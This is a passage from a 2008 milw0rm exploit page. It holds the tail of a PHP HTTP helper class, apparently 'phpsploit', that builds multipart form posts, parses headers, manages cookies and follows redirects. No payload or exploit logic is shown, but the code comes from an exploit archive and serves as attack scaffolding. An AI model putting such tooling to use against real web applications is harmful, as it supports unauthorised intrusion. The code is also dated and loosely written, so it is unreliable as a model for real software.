		$this-&gt;method=&quot;formdata&quot;;
		$this-&gt;data='';
		if(!isset($array[frmdt_boundary])) $this-&gt;boundary=&quot;phpsploit&quot;;
		else $this-&gt;boundary=$array[frmdt_boundary];
		foreach($array as $key =&gt; $value)
		{
			if(!preg_match(&quot;#^frmdt_(boundary|url)#&quot;,$key))
			{
				$this-&gt;data .= &quot;-----------------------------&quot;.$this-&gt;boundary.&quot;\r\n&quot;;
				$this-&gt;data .= &quot;Content-Disposition: form-data; name=\&quot;&quot;.$key.&quot;\&quot;;&quot;;
				if(!is_array($value))
				{
					$this-&gt;data .= &quot;\r\n\r\n&quot;.$value.&quot;\r\n&quot;;
				}
				else
				{
					$this-&gt;data .= &quot; filename=\&quot;&quot;.$array[$key][frmdt_filename].&quot;\&quot;;\r\n&quot;;
					if(isset($array[$key][frmdt_type])) $this-&gt;data .= &quot;Content-Type: &quot;.$array[$key][frmdt_type].&quot;\r\n&quot;;
					if(isset($array[$key][frmdt_transfert])) $this-&gt;data .= &quot;Content-Transfer-Encoding: &quot;.$array[$key][frmdt_transfert].&quot;\r\n&quot;;
					$this-&gt;data .= &quot;\r\n&quot;.$array[$key][frmdt_content].&quot;\r\n&quot;;
				}
			}
		}
		$this-&gt;data .= &quot;-----------------------------&quot;.$this-&gt;boundary.&quot;--\r\n&quot;;
		return $this-&gt;sock();
	}

	
	/**
	 * This function returns the content of the server response
	 * without the headers.
	 * 
	 * $this-&gt;getcontent($this-&gt;get(&quot;http://localhost/&quot;));
	 * or
	 * $this-&gt;getcontent();
	 *
	 * @param string $server_response
	 * @return $onlythecontent
	 */
	public function getcontent($code='')
	{
		if(empty($code)) $code = $this-&gt;recv;
		$content = explode(&quot;\n&quot;,$code);
		$onlycode = '';
		for($i=1;$i&lt;count($content);$i++)
		{
			if(!preg_match(&quot;/^(\S*):/&quot;,$content[$i])) $ok = 1;
			if($ok) $onlycode .= $content[$i].&quot;\n&quot;;
		}
		return $onlycode;
	}

	
	/**
	 * This function returns the headers of the server response
	 * without the content.
	 * 
	 * $this-&gt;getheader($this-&gt;post(&quot;http://localhost/x.php&quot;,&quot;x=1&amp;z=2&quot;));
	 * or
	 * $this-&gt;getheader();
	 *
	 * @param string $server_response
	 * @return $onlytheheaders
	 */
	public function getheader($code='')
	{
		if(empty($code)) $code = $this-&gt;recv;
		$header = explode(&quot;\n&quot;,$code);
		$onlyheader = $header[0].&quot;\n&quot;;
		for($i=1;$i&lt;count($header);$i++)
		{
			if(!preg_match(&quot;/^(\S*):/&quot;,$header[$i])) break;
			$onlyheader .= $header[$i].&quot;\n&quot;;
		}
		return $onlyheader;
	}

	
	/**
	 * This function is called by the cookiejar() function.
	 * It adds the value of the &quot;Set-Cookie&quot; header in the &quot;Cookie&quot;
	 * header for the next request. You don't have to call it.
	 * 
	 * @param string $server_response
	 */
	private function getcookie($code)
	{
		$carr = explode(&quot;\n&quot;,str_replace(&quot;\r\n&quot;,&quot;\n&quot;,$code));
		for($z=0;$z&lt;count($carr);$z++)
		{
			if(preg_match(&quot;/set-cookie: (.*)/i&quot;,$carr[$z],$cookarr))
			{
				$cookie[] = preg_replace(&quot;/expires=(.*)(GMT||UTC)(\S*)$/i&quot;,&quot;&quot;,preg_replace(&quot;/path=(.*)/i&quot;,&quot;&quot;,$cookarr[1]));
			}
		}

		for($i=0;$i&lt;count($cookie);$i++)
		{
			preg_match(&quot;/(\S*)=(\S*)(|;)/&quot;,$cookie[$i],$matches);
	    	        $cookn = $matches[1];
	    	        $cookv = $matches[2];
	    	        $this-&gt;addcookie($cookn,$cookv);
		}
    }

	
	/**
	 * This function is called by the get()/post() functions.
	 * You don't have to call it.
	 *
	 * @param string $urltarg
	 */
	private function target($urltarg)
	{
		if(!preg_match(&quot;/^http:\/\/(.*)\//&quot;,$urltarg)) $urltarg .= &quot;/&quot;;
		$this-&gt;url=$urltarg;
		
		$array = explode(&quot;/&quot;,str_replace(&quot;http://&quot;,&quot;&quot;,preg_replace(&quot;/:(\d+)/&quot;,&quot;&quot;,$urltarg)));
		$this-&gt;host=$array[0];

		preg_match(&quot;/:(\d+)\//&quot;,$urltarg,$matches);
		$this-&gt;port=empty($matches[1]) ? 80 : $matches[1];
		
		$temp = str_replace(&quot;http://&quot;,&quot;&quot;,preg_replace(&quot;/:(\d+)/&quot;,&quot;&quot;,$urltarg));
		preg_match(&quot;/\/(.*)\//&quot;,$temp,$matches);
		$this-&gt;path=str_replace(&quot;//&quot;,&quot;/&quot;,&quot;/&quot;.$matches[1].&quot;/&quot;);
	
		if($this-&gt;port &gt; 65535) die(&quot;Error: Invalid port number&quot;);
	}
	
	
	/**
	 * If you call this function, the script will
	 * extract all &quot;Set-Cookie&quot; headers values
	 * and it will automatically add them into the &quot;Cookie&quot; header
	 * for all next requests.
	 *
	 * $this-&gt;cookiejar(1); // enabled
	 * $this-&gt;cookiejar(0); // disabled
	 * 
	 */
	public function cookiejar($code)
	{
		if($code===0) $this-&gt;cookiejar='';
		if($code===1) $this-&gt;cookiejar=1;
		else
		{
			$this-&gt;getcookie($code);
		}
	}


	/**
	 * If you call this function, the script will
	 * follow all redirections sent by the server.
	 * 
	 * $this-&gt;allowredirection(1); // enabled
	 * $this-&gt;allowredirection(0); // disabled
	 * 
	 * @return $this-&gt;get($locationresponse)
	 */
	public function allowredirection($code)
	{
		if($code===0) $this-&gt;allowredirection='';
		if($code===1) $this-&gt;allowredirection=1;
		else
		{
			if(preg_match(&quot;/(location|content-location|uri): (.*)/i&quot;,$code,$codearr))
			{
				$location = str_replace(chr(13),'',$codearr[2]);
				if(!eregi(&quot;://&quot;,$location))
				{
					return $this-&gt;get(&quot;http://&quot;.$this-&gt;host.$this-&gt;path.$location);
				}
				else
				{
					return $this-&gt;get($location);
				}
			}
			else
			{
				return $code;
			}
		}
	}
	
	
	/**
	 * This function allows you to reset some parameters:
	 * 
	 * $this-&gt;reset(header); // headers cleaned
	 * $this-&gt;reset(cookie); // cookies cleaned
	 * $this-&gt;reset();       // clean all parameters
	 *
	 * @param string $func
	 */
	public function reset($func='')
	{
		switch($func)
		{
			case &quot;header&quot;:
			$this-&gt;header='';
			break;
			
			case &quot;cookie&quot;:
			$this-&gt;cookie='';
			break;
			
			default:
		        $this-&gt;cookiejar='';
		        $this-&gt;header='';
		        $this-&gt;cookie='';
		        $this-&gt;allowredirection=''; 
		        $this-&gt;agent='';
		        break;
		}
	}
}
?&gt;

# milw0rm.com [2008-04-01]</pre></html>